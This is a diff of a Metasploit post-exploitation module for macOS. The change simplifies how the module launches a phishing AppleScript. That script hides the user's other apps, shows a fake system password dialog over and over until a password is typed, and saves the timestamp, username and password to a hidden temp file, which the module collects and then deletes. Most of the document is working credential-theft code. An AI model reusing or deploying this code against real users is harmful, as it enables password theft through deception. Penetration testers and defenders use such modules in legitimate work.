@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -21,7 +19,8 @@ class Metasploit3 < Msf::Post
         'License'       => MSF_LICENSE,
         'Author'        => [
           'Joff Thyer <jsthyer[at]gmail.com>', # original post module
-          'joev <jvennix[at]rapid7.com>' # bug fixes
+          'joev', # bug fixes
+          'Peter Toth <globetother[at]gmail.com>' # bug fixes
         ],
         'Platform'      => [ 'osx' ],
         'References'    => [
@@ -59,10 +58,10 @@ class Metasploit3 < Msf::Post
     ], self.class)
   end
 
-  def cmd_exec(str)
-    print_status "Running cmd '#{str}'..."
-    super
-  end
+#  def cmd_exec(str, args)
+#    print_status "Running cmd '#{str} #{args}'..."
+#    super
+#  end
 
   # Run Method for when run command is issued
   def run
@@ -81,29 +80,23 @@ class Metasploit3 < Msf::Post
     print_status("Running module against #{host}")
 
     dir       = "/tmp/." + Rex::Text.rand_text_alpha((rand(8)+6))
-    runme     = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
     creds_osa = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
-    creds     = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
     pass_file = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
 
     username = cmd_exec("/usr/bin/whoami").strip
     cmd_exec("umask 0077")
     cmd_exec("/bin/mkdir #{dir}")
 
-    # write the script that will launch things
-    write_file(runme, run_script)
-    cmd_exec("/bin/chmod 700 #{runme}")
-
-    # write the credentials script, compile and run
+    # write the credentials script and run
     write_file(creds_osa,creds_script(pass_file))
-    cmd_exec("/usr/bin/osacompile -o #{creds} #{creds_osa}")
-    cmd_exec("#{runme} #{creds}")
+    cmd_exec("osascript #{creds_osa}")
+
     print_status("Waiting for user '#{username}' to enter credentials...")
 
     timeout = ::Time.now.to_f + datastore['TIMEOUT'].to_i
     pass_found = false
     while (::Time.now.to_f < timeout)
-      if ::File.exist?(pass_file)
+      if file_exist?(pass_file)
         print_status("Password entered! What a nice compliant user...")
         pass_found = true
         break
@@ -124,51 +117,38 @@ class Metasploit3 < Msf::Post
     cmd_exec("/usr/bin/srm -rf #{dir}")
   end
 
-  # "wraps" the #creds_script applescript and allows it to make UI calls
-  def run_script
-    %Q{
-      #!/bin/bash
-      osascript <<EOF
-      set scriptfile to "$1"
-      tell application "AppleScript Runner"
-        do script scriptfile
-      end tell
-      EOF
-    }
-  end
-
   # applescript that displays the actual password prompt dialog
   def creds_script(pass_file)
     textcreds = datastore['TEXTCREDS']
     ascript = %Q{
-      set filename to "#{pass_file}"
-      set myprompt to "#{textcreds}"
-      set ans to "Cancel"
-      repeat
-        try
-          tell application "Finder"
-            activate
-            tell application "System Events" to keystroke "h" using {command down, option down}
-            set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "#{datastore['ICONFILE']}" in bundle "#{datastore['BUNDLEPATH']}"
-            set ans to button returned of d_returns
-            set mypass to text returned of d_returns
-            if ans is equal to "OK" and mypass is not equal to "" then exit repeat
-          end tell
-        end try
-      end repeat
-      try
-        set now to do shell script "date '+%Y%m%d_%H%M%S'"
-          set user to do shell script "whoami"
-        set myfile to open for access filename with write permission
-        set outstr to now & ":" & user & ":" & mypass & "
-      "
-        write outstr to myfile starting at eof
-        close access myfile
-      on error
-        try
-          close access myfile
-        end try
-      end try
+set filename to "#{pass_file}"
+set myprompt to "#{textcreds}"
+set ans to "Cancel"
+repeat
+  try
+    tell application "Finder"
+      activate
+      tell application "System Events" to keystroke "h" using {command down, option down}
+      set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "#{datastore['ICONFILE']}" in bundle "#{datastore['BUNDLEPATH']}"
+      set ans to button returned of d_returns
+      set mypass to text returned of d_returns
+      if ans is equal to "OK" and mypass is not equal to "" then exit repeat
+    end tell
+  end try
+end repeat
+try
+  set now to do shell script "date '+%Y%m%d_%H%M%S'"
+    set user to do shell script "whoami"
+  set myfile to open for access filename with write permission
+  set outstr to now & ":" & user & ":" & mypass & "
+"
+  write outstr to myfile starting at eof
+  close access myfile
+on error
+  try
+    close access myfile
+  end try
+end try
     }
   end
 
